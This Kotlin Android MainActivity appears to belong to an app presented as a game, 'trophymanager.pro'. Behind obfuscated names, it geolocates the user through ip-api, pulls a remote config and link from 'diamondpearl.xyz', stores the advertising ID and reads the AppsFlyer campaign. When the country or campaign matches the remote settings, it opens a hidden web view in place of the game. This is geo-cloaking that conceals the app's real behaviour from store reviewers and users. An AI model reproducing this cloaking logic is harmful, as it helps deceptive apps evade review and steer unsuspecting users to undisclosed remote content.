package com.trophymanager.pro

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.orhanobut.hawk.Hawk
import com.trophymanager.pro.CompanionClasss.Companion.froofrfo
import com.trophymanager.pro.CompanionClasss.Companion.MAIN_IDfrrrr
import com.trophymanager.pro.CompanionClasss.Companion.apapap
import com.trophymanager.pro.CompanionClasss.Companion.linkfrrr
import com.trophymanager.pro.databinding.ActivityMainBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    lateinit var jukjkouk: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)


        jukjkouk = ActivityMainBinding.inflate(layoutInflater)
        setContentView(jukjkouk.root)
        GlobalScope.launch(Dispatchers.IO) {
            frgttgtt
        }

        AppsFlyerLib.getInstance()
            .init("GiCsLy2CzntUY65KhhdpqD", ccrfrfrf, applicationContext)
        AppsFlyerLib.getInstance().start(this)

    }

    private fun getAdId(){
        val adInfo = AdvertisingIdClient(applicationContext)
        adInfo.start()
        val adIdInfo = adInfo.info.id
        Hawk.put(MAIN_IDfrrrr, adIdInfo)
    }


    //Data API
    private suspend fun gtgtgttt(): String? {
        val retrofitBuilder = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ApiInterfaaaaaaaace::class.java)

        val retData = retrofitBuilder.getData().body()?.countryCodedrfr
        return retData

    }


    private suspend fun getDataDev(): String? {
        val retroBuildTwo = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://diamondpearl.xyz/")
            .build()
            .create(ApiInterfaaaaaaaace::class.java)

        val frfrrr = retroBuildTwo.getDataDev().body()?.viewfrrr
        val frrffrrf = retroBuildTwo.getDataDev().body()?.appsCheckerfrrr
        Hawk.put(apapap, frrffrrf)
        Hawk.put(linkfrrr, frfrrr)
        val retroData = retroBuildTwo.getDataDev().body()?.geofrrr
        return retroData
    }


    private val frgttgtt: Job = GlobalScope.launch(Dispatchers.IO) {
        val countyCodefrr: String = gtgtgttt().toString()
        val gtgtgtgt = getDataDev().toString()
        val frfrr: String? = Hawk.get(apapap)
        var ggtgthyhy: String? = Hawk.get(froofrfo)

        getAdId()
        if (frfrr == "1") {
            val executorService = Executors.newSingleThreadScheduledExecutor()
            executorService.scheduleAtFixedRate({
                if (ggtgthyhy != null) {
                    if (ggtgthyhy!!.contains("tdb2") || gtgtgtgt.contains(countyCodefrr)) {
                        executorService.shutdown()
                        startActivity(Intent(this@MainActivity, VebSearchActivity::class.java))
                        finish()
                    } else {
                        executorService.shutdown()
                        startActivity(Intent(this@MainActivity, GaaaggaaameActivity::class.java))
                        finish()
                    }
                } else {
                    ggtgthyhy =  Hawk.get(froofrfo)
                }

            }, 0, 2, TimeUnit.SECONDS)
        }
        else if (gtgtgtgt.contains(countyCodefrr)) {
            startActivity(Intent(this@MainActivity, VebSearchActivity::class.java))
            finish()
        } else {
            startActivity(Intent(this@MainActivity, GaaaggaaameActivity::class.java))
            finish()
        }
    }

    private val ccrfrfrf = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val rfrfrf = data?.get("campaign").toString()
            Hawk.put(froofrfo, rfrfrf)
        }

        override fun onConversionDataFail(p0: String?) {
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }
}


